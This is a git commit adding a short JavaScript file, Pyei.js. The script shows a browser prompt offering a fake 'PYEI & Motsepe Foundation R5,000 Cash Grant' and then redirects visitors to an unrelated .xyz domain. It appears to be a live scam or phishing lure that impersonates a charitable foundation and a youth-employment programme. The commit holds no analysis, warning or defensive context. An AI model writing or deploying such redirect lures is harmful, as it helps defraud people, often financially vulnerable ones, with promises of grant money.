1a7ce523102afa61732f8b6a215be8fc943458e9
bigetijazz22 <bigetijazz22@gmail.com>
2025-08-12 09:17:18 +0100

    Create Pyei.js

---
+++ Pyei.js
@@ -0,0 +1,6 @@
+
+var password = 'Withdraw R5,000'
+password=prompt('Hello: You are invited to PYEI & Motsepe Foundation R5,000 Cash Grant Programm 2025  , press OK to apply ','Withdraw R5,000');
+if (password != 'Withdraw R5,000') {
+location.href='https://www.chadoffrez.xyz/Motsepe-R5000-PYEI-2025-Grant';
+}
